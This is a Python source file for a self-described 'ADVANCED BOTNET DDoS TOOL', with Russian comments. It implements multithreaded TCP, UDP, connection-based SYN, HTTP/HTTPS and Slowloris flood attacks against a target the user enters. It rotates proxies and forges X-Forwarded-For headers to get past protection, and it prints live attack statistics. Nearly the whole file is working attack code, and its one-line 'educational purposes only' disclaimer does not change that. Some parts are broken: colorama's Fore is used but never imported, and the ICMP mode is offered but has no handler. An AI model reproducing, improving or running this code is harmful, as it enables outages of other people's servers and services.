import socket
import threading
import time
import random
import sys
import os
from src.utils import ui
import requests
import urllib3
import struct
import ssl
import select
import queue
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

# Отключаем предупреждения SSL
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class AdvancedBotNet:
    def __init__(self):
        self.target = None
        self.port = None
        self.threads = 500  # Увеличиваем количество потоков
        self.duration = 60
        self.bots = []
        self.attack_mode = 'TCP'
        self.http_url = None
        self.proxy_list = []
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59'
        ]
        self.attack_payloads = [
            b"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n",
            b"POST / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nContent-Length: 1000\r\nConnection: keep-alive\r\n\r\n" + b"A" * 1000,
            b"HEAD / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nConnection: keep-alive\r\n\r\n"
        ]
        self.stats = {
            'requests_sent': 0,
            'bytes_sent': 0,
            'successful_connections': 0,
            'failed_connections': 0,
            'start_time': 0,
            'active_bots': 0
        }
        self.load_proxies()
        
    def load_proxies(self):
        """Загружаем прокси из файла"""
        try:
            if os.path.exists('Tools/proxies.txt'):
                with open('Tools/proxies.txt', 'r') as f:
                    self.proxy_list = [line.strip() for line in f if line.strip()]
                print(f"{Fore.CYAN}[*] Loaded {len(self.proxy_list)} proxies")
        except:
            pass

    def print_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        banner = (
            "   █████   █    ██  ▄▄▄       ███▄    █ ▄▄▄█���███▓ █    ██  ███▄ ▄███▓\n"
            " ▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒ ██  ▓██▒▓██▒▀█▀ ██▒\n"
            " ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▓██  ▒██░▓██    ▓██░\n"
            " ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▓▓█  ░██░▒██    ▒██ \n"
            " ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ▒▒█████▓ ▒██▒   ░██▒\n"
            " ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░\n"
            "  ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░    ░    ░░▒░ ░ ░ ░  ░      ░\n"
            "    ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░   ░       ░░░ ░ ░ ░      ░   \n"
            "     ░       ░           ░  ░         ░             ░            ░   "
        )
        ui.print_banner(banner, author="Sqrilizz", version="ADVANCED BOTNET DDoS TOOL v7.0")

    def get_user_input(self):
        print(f"{Fore.CYAN}[*] Advanced BotNet Configuration")
        print(f"{Fore.CYAN}[*] ==============================\n")
        
        # Attack Mode Selection
        print(f"{Fore.CYAN}[*] Attack Modes:")
        print(f"{Fore.WHITE}    1. TCP Flood - мощная TCP атака")
        print(f"{Fore.WHITE}    2. HTTP Flood - веб-атака")
        print(f"{Fore.WHITE}    3. HTTPS Flood - защищенная веб-атака")
        print(f"{Fore.WHITE}    4. UDP Flood - быстрая UDP атака")
        print(f"{Fore.WHITE}    5. SYN Flood - SYN пакеты")
        print(f"{Fore.WHITE}    6. ICMP Flood - пинг-атака")
        print(f"{Fore.WHITE}    7. Slowloris - медленная атака")
        print(f"{Fore.WHITE}    8. Mixed Attack - все методы")
        
        while True:
            try:
                choice = input(f"\n{Fore.YELLOW}[?] Select attack mode (1-8): ").strip()
                if choice in ['1', '2', '3', '4', '5', '6', '7', '8']:
                    modes = {
                        '1': 'TCP',
                        '2': 'HTTP',
                        '3': 'HTTPS',
                        '4': 'UDP',
                        '5': 'SYN',
                        '6': 'ICMP',
                        '7': 'SLOWLORIS',
                        '8': 'MIXED'
                    }
                    self.attack_mode = modes[choice]
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-8.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        # Target Configuration
        if self.attack_mode in ['TCP', 'UDP', 'SYN', 'ICMP']:
            print(f"\n{Fore.YELLOW}[*] Enter target IP: ", end="")
            self.target = input().strip()
            print(f"{Fore.YELLOW}[*] Enter target port (default 80): ", end="")
            port_input = input().strip()
            self.port = int(port_input) if port_input else 80
        else:
            print(f"\n{Fore.YELLOW}[*] Enter target URL: ", end="")
            self.http_url = input().strip()
            if not self.http_url.startswith(('http://', 'https://')):
                self.http_url = f"http://{self.http_url}"

        # Performance Configuration
        print(f"\n{Fore.CYAN}[*] Performance Settings:")
        try:
            self.threads = int(input(f"{Fore.YELLOW}[?] Number of bots (default 500): ").strip() or "500")
        except ValueError:
            self.threads = 500
            
        try:
            self.duration = int(input(f"{Fore.YELLOW}[?] Attack duration in seconds (default 60): ").strip() or "60")
        except ValueError:
            self.duration = 60

        return True

    def create_bot(self):
        return {
            'id': random.randint(1000, 9999),
            'status': 'ready',
            'requests_sent': 0,
            'bytes_sent': 0,
            'last_activity': time.time(),
            'connection_count': 0
        }

    def get_random_headers(self):
        """Генерируем случайные заголовки для обхода защиты"""
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            'X-Real-IP': f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': 'https://www.google.com/',
            'DNT': '1'
        }
        return headers

    def bot_attack_tcp(self, bot):
        """Улучшенная TCP атака"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, self.port))
            bot['status'] = 'attacking'
            bot['connection_count'] += 1
            
            print(f"{Fore.CYAN}[BOT-{bot['id']}] TCP Connected to {self.target}:{self.port}")
            
            # Отправляем различные типы пакетов
            while bot['status'] == 'attacking':
                try:
                    payload = random.choice(self.attack_payloads)
                    payload = payload.replace(b'{host}', self.target.encode())
                    payload = payload.replace(b'{ua}', random.choice(self.user_agents).encode())
                    
                    start_time = time.time()
                    sock.send(payload)
                    send_time = (time.time() - start_time) * 1000
                    
                    bot['requests_sent'] += 1
                    bot['bytes_sent'] += len(payload)
                    bot['last_activity'] = time.time()
                    
                    print(f"{Fore.GREEN}[BOT-{bot['id']}] TCP Packet sent | "
                          f"Size: {len(payload)} bytes | Time: {send_time:.1f}ms | "
                          f"Total: {bot['requests_sent']} packets")
                    
                    # Небольшая задержка для стабильности
                    time.sleep(0.01)
                except Exception as e:
                    print(f"{Fore.RED}[BOT-{bot['id']}] TCP Error: {str(e)[:50]}...")
                    break
        except Exception as e:
            bot['status'] = 'error'
            print(f"{Fore.RED}[BOT-{bot['id']}] TCP Connection failed: {str(e)[:50]}...")
        finally:
            try:
                sock.close()
            except:
                pass

    def bot_attack_http(self, bot):
        """Улучшенная HTTP атака"""
        bot['status'] = 'attacking'
        session = requests.Session()
        
        # Настройка сессии для максимальной производительности
        session.headers.update(self.get_random_headers())
        
        while bot['status'] == 'attacking':
            try:
                # Используем прокси если доступны
                proxies = None
                proxy_used = "None"
                if self.proxy_list:
                    proxy = random.choice(self.proxy_list)
                    proxies = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                    proxy_used = proxy
                
                start_time = time.time()
                response = session.get(
                    self.http_url, 
                    headers=self.get_random_headers(),
                    proxies=proxies,
                    timeout=5, 
                    verify=False if self.attack_mode == 'HTTPS' else True,
                    stream=True
                )
                response_time = (time.time() - start_time) * 1000
                
                bot['requests_sent'] += 1
                bot['bytes_sent'] += len(response.content) if response.content else 0
                bot['last_activity'] = time.time()
                
                # Подробный вывод информации
                print(f"{Fore.GREEN}[BOT-{bot['id']}] HTTP {response.status_code} | "
                      f"Proxy: {proxy_used} | Time: {response_time:.1f}ms | "
                      f"Size: {len(response.content)} bytes | "
                      f"Total: {bot['requests_sent']} requests")
                
                # Быстрая отправка
                time.sleep(0.001)
            except Exception as e:
                print(f"{Fore.RED}[BOT-{bot['id']}] Error: {str(e)[:50]}... | Proxy: {proxy_used}")
                time.sleep(0.1)

    def bot_attack_udp(self, bot):
        """UDP flood атака"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            bot['status'] = 'attacking'
            
            print(f"{Fore.CYAN}[BOT-{bot['id']}] UDP Ready to attack {self.target}:{self.port}")
            
            while bot['status'] == 'attacking':
                try:
                    # Отправляем случайные данные разного размера
                    data_size = random.randint(64, 1024)
                    data = random.randbytes(data_size)
                    
                    start_time = time.time()
                    sock.sendto(data, (self.target, self.port))
                    send_time = (time.time() - start_time) * 1000
                    
                    bot['requests_sent'] += 1
                    bot['bytes_sent'] += len(data)
                    bot['last_activity'] = time.time()
                    
                    print(f"{Fore.GREEN}[BOT-{bot['id']}] UDP Packet sent | "
                          f"Size: {len(data)} bytes | Time: {send_time:.1f}ms | "
                          f"Total: {bot['requests_sent']} packets")
                except Exception as e:
                    print(f"{Fore.RED}[BOT-{bot['id']}] UDP Error: {str(e)[:50]}...")
                    break
        except Exception as e:
            bot['status'] = 'error'
            print(f"{Fore.RED}[BOT-{bot['id']}] UDP Setup failed: {str(e)[:50]}...")
        finally:
            try:
                sock.close()
            except:
                pass

    def bot_attack_syn(self, bot):
        """SYN flood атака"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            bot['status'] = 'attacking'
            
            while bot['status'] == 'attacking':
                try:
                    sock.connect((self.target, self.port))
                    sock.close()
                    
                    # Создаем новый сокет для следующего подключения
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    
                    bot['requests_sent'] += 1
                    bot['last_activity'] = time.time()
                except:
                    break
        except:
            bot['status'] = 'error'
        finally:
            try:
                sock.close()
            except:
                pass

    def bot_attack_slowloris(self, bot):
        """Slowloris атака - медленная атака на веб-сервер"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target, self.port))
            bot['status'] = 'attacking'
            
            print(f"{Fore.CYAN}[BOT-{bot['id']}] Slowloris Connected to {self.target}:{self.port}")
            
            # Отправляем частичный HTTP запрос
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(f"Host: {self.target}\r\n".encode())
            sock.send(b"User-Agent: " + random.choice(self.user_agents).encode() + b"\r\n")
            
            print(f"{Fore.YELLOW}[BOT-{bot['id']}] Slowloris Initial headers sent, keeping connection alive...")
            
            # Держим соединение открытым, отправляя заголовки по частям
            while bot['status'] == 'attacking':
                try:
                    header_value = str(random.randint(1, 5000))
                    sock.send(b"X-a: " + header_value.encode() + b"\r\n")
                    bot['requests_sent'] += 1
                    bot['last_activity'] = time.time()
                    
                    print(f"{Fore.GREEN}[BOT-{bot['id']}] Slowloris Header sent | "
                          f"Value: X-a:{header_value} | Total: {bot['requests_sent']} headers")
                    
                    time.sleep(random.uniform(10, 15))  # Медленная отправка
                except Exception as e:
                    print(f"{Fore.RED}[BOT-{bot['id']}] Slowloris Error: {str(e)[:50]}...")
                    break
        except Exception as e:
            bot['status'] = 'error'
            print(f"{Fore.RED}[BOT-{bot['id']}] Slowloris Connection failed: {str(e)[:50]}...")
        finally:
            try:
                sock.close()
            except:
                pass

    def start_attack(self):
        """Запуск улучшенной атаки"""
        print(f"{Fore.GREEN}[+] Initializing Advanced BotNet...")
        
        # Создаем ботов
        for i in range(self.threads):
            bot = self.create_bot()
            self.bots.append(bot)
        
        print(f"{Fore.GREEN}[+] Created {len(self.bots)} advanced bots")
        print(f"{Fore.GREEN}[+] Attack mode: {self.attack_mode}")
        if self.attack_mode in ['TCP', 'UDP', 'SYN', 'ICMP']:
            print(f"{Fore.GREEN}[+] Target: {self.target}:{self.port}")
        else:
            print(f"{Fore.GREEN}[+] Target: {self.http_url}")
        print(f"{Fore.GREEN}[+] Duration: {self.duration} seconds")
        print(f"{Fore.GREEN}[+] Proxies loaded: {len(self.proxy_list)}")
        print(f"{Fore.GREEN}[+] Press Ctrl+C to stop\n")
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                              ATTACK STARTED                                  ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝\n")
        
        self.stats['start_time'] = time.time()
        attack_threads = []
        
        # Запускаем атаку с использованием ThreadPoolExecutor для лучшей производительности
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            
            for bot in self.bots:
                if self.attack_mode == 'TCP':
                    future = executor.submit(self.bot_attack_tcp, bot)
                elif self.attack_mode in ['HTTP', 'HTTPS']:
                    future = executor.submit(self.bot_attack_http, bot)
                elif self.attack_mode == 'UDP':
                    future = executor.submit(self.bot_attack_udp, bot)
                elif self.attack_mode == 'SYN':
                    future = executor.submit(self.bot_attack_syn, bot)
                elif self.attack_mode == 'SLOWLORIS':
                    future = executor.submit(self.bot_attack_slowloris, bot)
                elif self.attack_mode == 'MIXED':
                    # Случайно выбираем метод атаки
                    methods = [self.bot_attack_tcp, self.bot_attack_http, self.bot_attack_udp, self.bot_attack_syn]
                    future = executor.submit(random.choice(methods), bot)
                
                futures.append(future)
            
            # Мониторинг прогресса
            try:
                while time.time() - self.stats['start_time'] < self.duration:
                    active_bots = sum(1 for bot in self.bots if bot['status'] == 'attacking')
                    total_requests = sum(bot['requests_sent'] for bot in self.bots)
                    total_bytes = sum(bot['bytes_sent'] for bot in self.bots)
                    elapsed = time.time() - self.stats['start_time']
                    rate = total_requests / elapsed if elapsed > 0 else 0
                    
                    # Подробная статистика каждые 5 секунд
                    if int(elapsed) % 5 == 0:
                        print(f"\n{Fore.MAGENTA}╔══════════════════════════════════════════════════════════════════════════════╗")
                        print(f"{Fore.MAGENTA}║                              LIVE STATISTICS                                 ║")
                        print(f"{Fore.MAGENTA}╚══════════════════════════════════════════════════════════════════════════════╝")
                        print(f"{Fore.CYAN}[*] Attack Mode: {self.attack_mode}")
                        print(f"{Fore.CYAN}[*] Target: {self.target if self.target else self.http_url}")
                        print(f"{Fore.GREEN}[+] Active Bots: {active_bots}/{len(self.bots)} ({active_bots/len(self.bots)*100:.1f}%)")
                        print(f"{Fore.GREEN}[+] Total Requests: {total_requests:,}")
                        print(f"{Fore.GREEN}[+] Total Bytes Sent: {total_bytes/1024/1024:.2f} MB")
                        print(f"{Fore.YELLOW}[*] Current Rate: {rate:.1f} requests/second")
                        print(f"{Fore.YELLOW}[*] Average Rate: {total_requests/elapsed:.1f} requests/second")
                        print(f"{Fore.CYAN}[*] Elapsed Time: {elapsed:.1f}s / {self.duration}s")
                        print(f"{Fore.CYAN}[*] Time Remaining: {self.duration - elapsed:.1f}s")
                        print(f"{Fore.MAGENTA}══════════════════════════════════════════════════════════════════════════════════\n")
                    
                    time.sleep(1)
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Attack stopped by user")
            
            # Останавливаем всех ботов
            for bot in self.bots:
                bot['status'] = 'stopped'
            
            # Ждем завершения всех потоков
            for future in as_completed(futures, timeout=5):
                try:
                    future.result()
                except:
                    pass

    def print_final_stats(self):
        """Вывод финальной статистики"""
        print(f"\n{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                              FINAL STATISTICS                                ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝")
        
        total_requests = sum(bot['requests_sent'] for bot in self.bots)
        total_bytes = sum(bot['bytes_sent'] for bot in self.bots)
        active_bots = sum(1 for bot in self.bots if bot['status'] == 'attacking')
        elapsed = time.time() - self.stats['start_time']
        rate = total_requests / elapsed if elapsed > 0 else 0
        
        print(f"{Fore.GREEN}[+] Attack completed!")
        print(f"{Fore.GREEN}[+] Total requests sent: {total_requests:,}")
        print(f"{Fore.GREEN}[+] Total bytes sent: {total_bytes/1024/1024:.2f} MB")
        print(f"{Fore.GREEN}[+] Average requests per bot: {total_requests // len(self.bots):,}")
        print(f"{Fore.CYAN}[+] Average rate: {rate:.1f} requests/second")
        print(f"{Fore.CYAN}[+] Active bots at end: {active_bots}")
        print(f"{Fore.CYAN}[+] Total time: {elapsed:.1f} seconds")

    def run(self):
        """Основной метод запуска"""
        self.print_banner()
        
        if not self.get_user_input():
            return
        
        print(f"\n{Fore.RED}[!] WARNING: This tool is for educational purposes only!")
        print(f"{Fore.RED}[!] Using this tool for illegal activities is your responsibility!")
        print(f"{Fore.YELLOW}[?] Continue? (y/n): ", end="")
        if input().lower() != 'y':
            print(f"{Fore.YELLOW}[!] Attack cancelled")
            return
        
        self.start_attack()
        self.print_final_stats()

def main():
    try:
        botnet = AdvancedBotNet()
        botnet.run()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Exiting...")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {e}")
    finally:
        input(f"\n{Fore.CYAN}Press Enter to exit...")

if __name__ == "__main__":
    main() 